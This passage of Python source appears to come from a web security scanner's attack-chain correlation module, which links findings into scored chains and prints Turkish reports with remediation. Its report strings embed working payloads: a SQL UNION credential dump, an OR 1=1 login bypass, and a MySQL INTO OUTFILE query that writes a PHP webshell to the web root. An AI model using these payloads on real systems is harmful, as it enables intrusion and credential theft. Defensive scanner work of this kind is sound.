            node_id=reuse_id, vuln_type="password_reuse",
            severity="High", cvss=8.0, url=best.url,
            raw={"type": "Parola Tekrar Kullanımı (Zincir)"},
        )
        ato_node = ChainNode(
            node_id=ato_id, vuln_type="account_takeover",
            severity="Critical", cvss=9.5, url=best.url,
            raw={"type": "Hesap Ele Geçirme (Zincir Sonuç)"},
        )

        for node in [dump_node, reuse_node, ato_node]:
            graph.add_node(node)

        graph.add_edge(ChainEdge(best.node_id, dump_id,  "enables", 1.5))
        graph.add_edge(ChainEdge(dump_id,      reuse_id, "enables", 1.3))
        graph.add_edge(ChainEdge(reuse_id,     ato_id,   "enables", 1.2))

        cvss = CVSSChainCalculator.combined(
            [best.cvss, 8.0, 8.0, 9.5], [1.5, 1.3, 1.2]
        )

        return [self._to_finding(
            chain_id=self.CHAIN_ID,
            title="4-Hop Zincir: SQLi → Kimlik Bilgisi Dökümü → Parola Tekrar Kullanımı → ATO",
            description=(
                "**Tespit Edilen Kritik 4-Adımlı Zincir**\n\n"
                "**Adım 1 — SQL Injection**\n"
                f"  URL: `{best.url}`\n"
                "  Veritabanına keyfi SQL sorgusu gönderilebilir.\n\n"
                "**Adım 2 — Kimlik Bilgisi Dökümü**\n"
                "  ```sql\n"
                "  ' UNION SELECT username, password, email FROM users--\n"
                "  ```\n"
                "  Hash'ler (MD5/SHA1/bcrypt) offline kırılır.\n\n"
                "**Adım 3 — Parola Tekrar Kullanımı**\n"
                "  Kırılan parolalar test edilir: Gmail, SSH, admin panel, VPN, GitHub.\n"
                "  Credential Stuffing araçları: Hydra, Burp Intruder, Snipr.\n\n"
                "**Adım 4 — Hesap Ele Geçirme**\n"
                "  Admin / yönetici hesaplarına giriş yapılır.\n"
                "  Tam sistem kontrolü, tüm kullanıcı verilerine erişim.\n\n"
                f"**Birleşik CVSS**: {cvss}"
            ),
            severity="Critical",
            confidence="High",
            nodes=[best, dump_node, reuse_node, ato_node],
            cvss_score=cvss,
            cvss_vector=CVSSChainCalculator.vector_string(
                attack_vector="N", attack_complexity="L",
                scope="C", confidentiality="H", integrity="H", availability="H",
            ),
            url=best.url,
            remediation=(
                "1. Tüm SQL sorgularında parameterized queries kullanın.\n"
                "2. Veritabanı kullanıcısını minimum ayrıcalıkla yapılandırın.\n"
                "3. Parola hash'leme için bcrypt / Argon2 kullanın.\n"
                "4. Çok faktörlü kimlik doğrulama (MFA) zorunlu hale getirin.\n"
                "5. Credential stuffing koruması için rate limiting uygulayın."
            ),
        )]


class SQLiAdminFileWriteRCEChain(ChainRule):
    """SQLi → Admin Bypass → MySQL OUTFILE → RCE — 4-Hop."""

    REQUIRED_TYPES = ["sqli"]
    CHAIN_ID = "sqli_admin_filewrite_rce"
    PRIORITY = 8

    def apply(self, graph, nodes_by_type):
        sqli_nodes = nodes_by_type.get("sqli", [])
        # Sadece High/Critical SQLi için uygula
        critical_sqli = [n for n in sqli_nodes if n.severity_rank >= 4]
        if not critical_sqli:
            return []

        best = max(critical_sqli, key=lambda n: n.cvss)

        admin_id = f"admin_bypass_{best.node_id}"
        write_id = f"file_write_{best.node_id}"
        rce_id   = f"rce_fw_{best.node_id}"

        admin_node = ChainNode(admin_id, "admin_bypass",    "Critical", 9.0, best.url,
                               {"type": "Admin Panel Bypass (Zincir)"})
        write_node = ChainNode(write_id, "file_write",      "Critical", 9.0, best.url,
                               {"type": "MySQL OUTFILE Webshell Yazma (Zincir)"})
        rce_node   = ChainNode(rce_id,   "rce",             "Critical", 9.8, best.url,
                               {"type": "RCE via SQLi OUTFILE (Zincir Sonuç)"})

        for node in [admin_node, write_node, rce_node]:
            graph.add_node(node)

        graph.add_edge(ChainEdge(best.node_id, admin_id, "enables", 1.3))
        graph.add_edge(ChainEdge(admin_id,     write_id, "enables", 1.4))
        graph.add_edge(ChainEdge(write_id,     rce_id,   "enables", 1.5))

        cvss = CVSSChainCalculator.combined(
            [best.cvss, 9.0, 9.0, 9.8], [1.3, 1.4, 1.5]
        )

        return [self._to_finding(
            chain_id=self.CHAIN_ID,
            title="4-Hop Zincir: SQLi → Admin Bypass → Dosya Yazma → RCE",
            description=(
                "**Tespit Edilen Kritik 4-Adımlı Zincir: SQLi→RCE**\n\n"
                "**Adım 1 — SQL Injection**\n"
                f"  URL: `{best.url}`\n"
                "  Union/Error tabanlı SQLi tespit edildi.\n\n"
                "**Adım 2 — Admin Bypass**\n"
                "  SQLi ile admin credentials dump edilir, admin paneline giriş yapılır:\n"
                "  `' OR '1'='1'--` veya credential dump → şifre kırma yöntemiyle.\n\n"
                "**Adım 3 — MySQL OUTFILE Dosya Yazma**\n"
                "  ```sql\n"
                "  SELECT '<?php system($_GET[\"cmd\"]); ?>'\n"
                "  INTO OUTFILE '/var/www/html/shell.php'\n"
                "  ```\n"
                "  Web root'a PHP webshell yazılır.\n\n"
                "**Adım 4 — RCE**\n"
                "  `https://target.com/shell.php?cmd=id`\n"
                "  → `uid=33(www-data) gid=33(www-data) groups=33(www-data)`\n\n"
                f"**Birleşik CVSS**: {cvss}"
            ),
            severity="Critical",
            confidence="Medium",
            nodes=[best, admin_node, write_node, rce_node],
            cvss_score=cvss,
            cvss_vector=CVSSChainCalculator.vector_string(
                attack_vector="N", scope="C",
                confidentiality="H", integrity="H", availability="H",
            ),
            url=best.url,
            remediation=(
                "1. Parameterized queries ile SQLi'yi tamamen ortadan kaldırın.\n"
                "2. MySQL kullanıcısına FILE privilege vermeyin.\n"
                "3. Web root dizinine MySQL'in yazma yetkisi bulunmamalı.\n"
                "4. `secure_file_priv` MySQL parametresiyle dosya yazma kısıtlayın."
            ),
        )]


# ─────────────────────────────────────────────────────────────────────────────
# PlaybookChainRule — YAML Tabanlı Özel Zincir
# ─────────────────────────────────────────────────────────────────────────────

class PlaybookChainRule(ChainRule):
    """
    YAML playbook dosyasından yüklenen özel zincir kuralı.

    Playbook YAML formatı:
    ```yaml
    name: "Custom Attack Chain"
    chain_id: "custom_001"
    severity: "Critical"
    confidence: "High"
    priority: 50
    required_types:
      - sqli
      - rce
    steps:
      - type: sqli
        label: "SQL Injection"
        description: "Veritabanına erişim sağlandı."
      - type: rce
        label: "Remote Code Execution"
        description: "Sunucuda komut çalıştırıldı."
    impact: "Tam sistem kontrolü elde edildi."
    remediation: "SQLi fix + RCE prevention."
    ```
    """

    def __init__(self, playbook: Dict[str, Any]) -> None:
        self._pb = playbook
        self.REQUIRED_TYPES = playbook.get("required_types", [])
        self.CHAIN_ID       = playbook.get("chain_id", "playbook_chain")
        self.PRIORITY       = playbook.get("priority", 50)

    def apply(self, graph, nodes_by_type):
        if self._missing_types(nodes_by_type):
            return []

        steps = self._pb.get("steps", [])
        selected_nodes: List[ChainNode] = []

        for step in steps:
            candidates = nodes_by_type.get(step.get("type", ""), [])
            if not candidates:
                return []
            selected_nodes.append(max(candidates, key=lambda n: n.cvss))

        # Graf kenarları
        for i in range(len(selected_nodes) - 1):
            graph.add_edge(ChainEdge(
                selected_nodes[i].node_id,
                selected_nodes[i + 1].node_id,
                "playbook_step", 1.2,
            ))

        cvss = CVSSChainCalculator.combined(
            [n.cvss for n in selected_nodes],
            [1.2] * max(0, len(selected_nodes) - 1),
        )

        step_parts = [
            f"**Adım {i + 1} — {step.get('label', step.get('type', ''))}**\n"
            f"  URL: `{node.url}`\n"
            f"  {step.get('description', '')}"
            for i, (step, node) in enumerate(zip(steps, selected_nodes))
        ]

        description = (
            f"**Playbook Zinciri: {self._pb.get('name', self.CHAIN_ID)}**\n\n"
            + "\n\n".join(step_parts)
            + f"\n\n**Etki**: {self._pb.get('impact', 'Yüksek güvenlik riski.')}\n\n"
            f"**Birleşik CVSS**: {cvss}"
        )

        finding = self._to_finding(
            chain_id=self.CHAIN_ID,
            title=f"Playbook Zinciri: {self._pb.get('name', self.CHAIN_ID)}",
            description=description,
            severity=self._pb.get("severity", "High"),
            confidence=self._pb.get("confidence", "Medium"),
            nodes=selected_nodes,
            cvss_score=cvss,
            url=selected_nodes[0].url if selected_nodes else "",
            remediation=self._pb.get("remediation", ""),
        )
        finding.playbook_name = self._pb.get("name", self.CHAIN_ID)
        return [finding]


# ─────────────────────────────────────────────────────────────────────────────
# PlaybookLoader — YAML Dosya Yükleyici
# ─────────────────────────────────────────────────────────────────────────────

class PlaybookLoader:
    """
    YAML playbook dosyalarını yükler ve PlaybookChainRule listesi döner.

    Arama yolları (öncelik sırasıyla):
      1. websecure/config/playbooks/*.yml
      2. ~/.websecure/playbooks/*.yml
      3. WEBSECURE_PLAYBOOK_DIR ortam değişkeni
      4. extra_dirs constructor parametresi
    """

    def __init__(self, extra_dirs: Optional[List[str]] = None) -> None:
        self._extra_dirs = extra_dirs or []

    def load_rules(self) -> List[PlaybookChainRule]:
        rules: List[PlaybookChainRule] = []
        for pb_path in self._find_playbooks():
            try:
                with open(pb_path, "r", encoding="utf-8") as f:
                    import yaml  # noqa: PLC0415 — lazy import (optional dep)
                    pb = yaml.safe_load(f)
                if isinstance(pb, dict) and "required_types" in pb:
                    rules.append(PlaybookChainRule(pb))
                    _logger.debug(f"[PlaybookLoader] Yüklendi: {pb_path.name}")
            except ModuleNotFoundError:
                _logger.warning("[PlaybookLoader] PyYAML yüklü değil. `pip install pyyaml`")
                break
            except Exception as exc:
                _logger.warning(f"[PlaybookLoader] {pb_path.name} yüklenemedi: {exc!r}")
        return rules

    def _find_playbooks(self) -> Generator[Path, None, None]:
        import os
        search_dirs: List[Path] = [
            Path(__file__).parent.parent / "config" / "playbooks",
            Path.home() / ".websecure" / "playbooks",
        ]
        if os.environ.get("WEBSECURE_PLAYBOOK_DIR"):
            search_dirs.append(Path(os.environ["WEBSECURE_PLAYBOOK_DIR"]))
        for d in self._extra_dirs:
            search_dirs.append(Path(d))

        for d in search_dirs:
            if d.is_dir():
                yield from d.glob("*.yml")
                yield from d.glob("*.yaml")


# ─────────────────────────────────────────────────────────────────────────────
# ExploitGraphBuilder — Bulgulardan Graf İnşa
# ─────────────────────────────────────────────────────────────────────────────

class ExploitGraphBuilder:
    """
    Tüm tarama bulgularını ExploitGraph düğümlerine dönüştürür.
    Tip normalizasyon haritasıyla farklı scanner formatlarını birleştirir.
    """

    # Ham tip → canonical tip eşlem tablosu
    TYPE_MAP: Dict[str, str] = {
        # XSS
        "xss": "xss", "cross-site scripting": "xss", "cross site scripting": "xss",
        "reflected xss": "xss", "stored xss": "xss", "dom xss": "xss",
        "mutation xss": "xss", "blind xss": "xss", "script": "xss",
        # CSRF
        "csrf": "csrf", "xsrf": "csrf", "cross-site request forgery": "csrf",
        # SQLi
        "sqli": "sqli", "sql injection": "sqli", "sql": "sqli",
        "blind sqli": "sqli", "error-based sqli": "sqli", "union sqli": "sqli",
        "time-based sqli": "sqli", "second-order sqli": "sqli",
        "oob sqli": "sqli", "stacked sqli": "sqli",
        # LFI
        "lfi": "lfi", "local file inclusion": "lfi", "path traversal": "lfi",
        "directory traversal": "lfi", "file inclusion": "lfi",
        # SSRF
        "ssrf": "ssrf", "server-side request forgery": "ssrf",
        "server side request forgery": "ssrf",
        # Upload
        "upload": "upload", "file upload": "upload", "unrestricted upload": "upload",
        "malicious upload": "upload",
        # IDOR
        "idor": "idor", "insecure direct object": "idor", "bola": "idor",
        "broken object level": "idor",
        # Disclosure
        "disclosure": "disclosure", "information disclosure": "disclosure",
        "sensitive data exposure": "disclosure", "leak": "disclosure",
        "sensitive": "disclosure", "information leak": "disclosure",
        # Redirect
        "redirect": "redirect", "open redirect": "redirect",
        "unvalidated redirect": "redirect", "url redirect": "redirect",
        # CMDI / RCE
        "cmdi": "cmdi", "command injection": "cmdi", "os command": "cmdi",
        "rce": "rce", "remote code execution": "rce",
        # SSTI
        "ssti": "ssti", "server-side template injection": "ssti",
        "template injection": "ssti",
        # XXE
        "xxe": "xxe", "xml external entity": "xxe",
        # CORS
        "cors": "cors", "cross-origin": "cors",
        # Session / Cookie
        "session": "session", "session fixation": "session",
        "cookie": "session",
        # Auth / JWT
        "jwt": "jwt", "json web token": "jwt",
        "auth": "auth", "authentication": "auth", "authorization": "auth",
        "2fa bypass": "auth", "oauth": "auth",
    }

    def build(self, results: Dict[str, Any]) -> ExploitGraph:
        graph = ExploitGraph()
        counter: Dict[str, int] = {}

        for finding in self._flatten(results):
            if not isinstance(finding, dict):
                continue
            raw_type  = str(finding.get("type", "")).lower()
            canonical = self._normalize(raw_type)
            severity  = finding.get("severity", "Info")
            url       = str(finding.get("url", ""))
            cvss      = self._extract_cvss(finding, severity)

            dedup_key = f"{canonical}:{url}"
            idx = counter.get(dedup_key, 0)
            counter[dedup_key] = idx + 1
            node_id = f"{canonical}_{abs(hash(url)) % 10_000}_{idx}"

            graph.add_node(ChainNode(
                node_id=node_id, vuln_type=canonical,
                severity=severity, cvss=cvss, url=url, raw=finding,
            ))

        _logger.debug(f"[ExploitGraph] {len(graph.nodes())} düğüm oluşturuldu.")
        return graph

    def _flatten(self, results: Dict[str, Any]) -> List[Dict[str, Any]]:
        flat: List[Dict[str, Any]] = []
        for v in results.values():
            if isinstance(v, list):
                flat.extend(v)
        return flat

    def _normalize(self, raw: str) -> str:
        for kw, canonical in self.TYPE_MAP.items():
            if kw in raw:
                return canonical
        parts = raw.split()
        return parts[0] if parts else "unknown"

    def _extract_cvss(self, finding: Dict[str, Any], severity: str) -> float:
        for key in ("cvss", "cvss_score", "score", "cvss3_score"):
            try:
                val = float(finding.get(key, 0))
                if 0 < val <= 10:
                    return val
            except (TypeError, ValueError):
                pass
        return CVSSChainCalculator.score_for_severity(severity)


# ─────────────────────────────────────────────────────────────────────────────
# MultiHopDetector — Otomatik Çok Adımlı Yol Keşfi
# ─────────────────────────────────────────────────────────────────────────────

class MultiHopDetector:
    """
    Grafta hiçbir rule tarafından tanımlanmamış ek A→B→C yollarını keşfeder.

    Kriter:
      - Minimum 3 düğüm (≥ 3-hop)
      - Birleşik CVSS ≥ MIN_COMBINED_CVSS
      - Daha önce raporlanmamış tip zinciri
    """

    MIN_HOPS          = 3
    MIN_COMBINED_CVSS = 7.0

    def detect(
        self,
        graph:                   ExploitGraph,
        already_reported:        Set[str],
    ) -> List[ChainFinding]:
        findings: List[ChainFinding] = []
        nodes = graph.nodes()

        for i, src in enumerate(nodes):
            for tgt in nodes[i + 1:]:
                for path_ids in graph.find_all_paths(src.node_id, tgt.node_id, max_depth=5):
                    if len(path_ids) < self.MIN_HOPS:
                        continue

                    path_nodes = [graph.get_node(nid) for nid in path_ids]
                    path_nodes = [n for n in path_nodes if n]

                    edges = graph._path_edges(path_ids)
                    cvss  = CVSSChainCalculator.combined(
                        [n.cvss for n in path_nodes],
                        [e.weight for e in edges],
                    )
                    if cvss < self.MIN_COMBINED_CVSS:
                        continue

                    chain_key = "→".join(n.vuln_type for n in path_nodes)
                    if chain_key in already_reported:
                        continue
                    already_reported.add(chain_key)

                    steps_desc = "\n\n".join(
                        f"**Adım {j + 1} — `{n.vuln_type}`** [{n.severity}]\n  URL: `{n.url}`"
                        for j, n in enumerate(path_nodes)
                    )

                    findings.append(ChainFinding(
                        chain_id=f"multihop_{chain_key[:48]}",
                        title=(
                            f"Otomatik Tespit: {len(path_nodes)}-Adımlı Exploit Zinciri"
                            f" [{chain_key}]"
                        ),
                        description=(
                            f"**Graftan Otomatik Keşfedilen {len(path_nodes)}-Hop Zinciri**\n\n"
                            f"{steps_desc}\n\n"
                            f"**Birleşik CVSS**: {cvss}"
                        ),
                        severity=_cvss_to_severity(cvss),
                        confidence="Medium",
                        cvss_score=cvss,
                        cvss_vector=CVSSChainCalculator.vector_string(),
                        url=path_nodes[0].url if path_nodes else "",
                        nodes=path_nodes,
                        path=ChainPath(
                            node_ids=path_ids,
                            edges=edges,
                            combined_cvss=cvss,
                            impact_label=_cvss_to_severity(cvss),
                        ),
                    ))

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# ChainReactor — Ana Orkestratör
# ─────────────────────────────────────────────────────────────────────────────

class ChainReactor:
    """
    Adım 14 ana motoru.

    Algoritma:
      1. ExploitGraphBuilder ile bulgulardan DAG inşa et
      2. Düğümleri vuln_type bazında grupla
      3. Tüm ChainRule'ları PRIORITY sırasıyla uygula
      4. MultiHopDetector ile ek zincirleri otomatik keşfet
      5. PlaybookLoader YAML kurallarını uygula
      6. Tüm ChainFinding'leri "chain_reactor" bucket'ına raporla
    """

    def __init__(
        self,
        playbook_dirs:    Optional[List[str]] = None,
        enable_multihop:  bool = True,
    ) -> None:
        self._builder         = ExploitGraphBuilder()
        self._pb_loader       = PlaybookLoader(extra_dirs=playbook_dirs)
        self._multihop        = MultiHopDetector()
        self._enable_multihop = enable_multihop
        self._rules           = self._build_rules()

    def _build_rules(self) -> List[ChainRule]:
        rules: List[ChainRule] = [
            # 3-hop (önce — en yüksek etki)
            LFILogPoisoningRCEChain(),
            SQLiCredDumpATOChain(),
            SQLiAdminFileWriteRCEChain(),
            XSSCSRFPrivEscChain(),
            SSRFLateralMovementChain(),
            # 2-hop
            XSSCSRFATOChain(),
            SSRFCloudCompromiseChain(),
            UploadLFIRCEChain(),
            InfoDisclosureIDORChain(),
            OpenRedirectXSSPhishingChain(),
        ]
        try:
            pb_rules = self._pb_loader.load_rules()
            if pb_rules:
                rules.extend(pb_rules)
                _logger.info(f"[ChainReactor] {len(pb_rules)} playbook kuralı yüklendi.")
        except Exception as exc:
            _logger.warning(f"[ChainReactor] Playbook yükleme hatası: {exc!r}")
        return sorted(rules, key=lambda r: r.PRIORITY)

    def analyze(self, results: Dict[str, Any]) -> List[ChainFinding]:
        """Ana giriş noktası — tüm bulguları analiz eder, zincir tespitlerini döner."""
        graph = self._builder.build(results)

        nodes_by_type: Dict[str, List[ChainNode]] = defaultdict(list)
        for node in graph.nodes():
            nodes_by_type[node.vuln_type].append(node)

        chain_findings:   List[ChainFinding] = []
        reported_ids:     Set[str]           = set()

        # Kuralları uygula
        for rule in self._rules:
            try:
                for cf in rule.apply(graph, nodes_by_type):
                    if cf.chain_id not in reported_ids:
                        chain_findings.append(cf)
                        reported_ids.add(cf.chain_id)
                        _logger.info(
                            f"[ChainReactor] ZİNCİR TESPİT: {cf.chain_id} "
                            f"[{cf.severity}] CVSS={cf.cvss_score}"
                        )
            except Exception as exc:
                _logger.error(
                    f"[ChainReactor] Kural {rule.CHAIN_ID} hatası: {exc!r}",
                    exc_info=True,
                )

        # Multi-hop otomatik keşif
        if self._enable_multihop:
            mh_findings = self._multihop.detect(graph, reported_ids)
            chain_findings.extend(mh_findings)
            if mh_findings:
                _logger.info(
                    f"[ChainReactor] MultiHop: {len(mh_findings)} ek zincir keşfedildi."
                )

        # Raporla
        try:
            from websecure.core.reporting import add_result
            for cf in chain_findings:
                add_result("chain_reactor", _chain_finding_to_dict(cf))
        except Exception as exc:
            _logger.warning(f"[ChainReactor] Raporlama hatası: {exc!r}")

        _logger.info(
            f"[ChainReactor] Analiz tamamlandı: {len(chain_findings)} zincir tespit edildi "
            f"({len(graph.nodes())} düğüm)."
        )
        return chain_findings


# ─────────────────────────────────────────────────────────────────────────────
# Yardımcı Fonksiyonlar
# ─────────────────────────────────────────────────────────────────────────────

def _keywords_in_raw(raw: Dict[str, Any], keywords: List[str]) -> bool:
    """Bulgu dict'indeki herhangi bir string değerde keyword arar."""
    blob = " ".join(str(v) for v in raw.values()).lower()
    return any(k.lower() in blob for k in keywords)


def _cvss_to_severity(score: float) -> str:
    if score >= 9.0:
        return "Critical"
    if score >= 7.0:
        return "High"
    if score >= 4.0:
        return "Medium"
    if score > 0.0:
        return "Low"
    return "Info"


def _chain_finding_to_dict(cf: ChainFinding) -> Dict[str, Any]:
    return {
        "type":         f"Chain: {cf.title}",
        "chain_id":     cf.chain_id,
        "title":        cf.title,
        "severity":     cf.severity,
        "confidence":   cf.confidence,
        "cvss_score":   cf.cvss_score,
        "cvss_vector":  cf.cvss_vector,
        "url":          cf.url,
        "description":  cf.description,
        "remediation":  cf.remediation,
        "playbook_name": cf.playbook_name,
        "chain_length": len(cf.nodes),
        "node_types":   [n.vuln_type for n in cf.nodes],
        "timestamp":    time.time(),
        "evidence": {
            "nodes": [
                {
                    "type":     n.vuln_type,
                    "severity": n.severity,
                    "cvss":     n.cvss,
                    "url":      n.url,
                }
                for n in cf.nodes
            ]
        },
    }


# ─────────────────────────────────────────────────────────────────────────────
# Geriye Uyumlu Public API
# ─────────────────────────────────────────────────────────────────────────────

def analyze_chains(results: Dict[str, Any]) -> None:
    """
    Geriye dönük uyumluluk giriş noktası.
    scan_runner / main tarafından tüm results dict'i ile çağrılır.
    """
    ChainReactor().analyze(results)
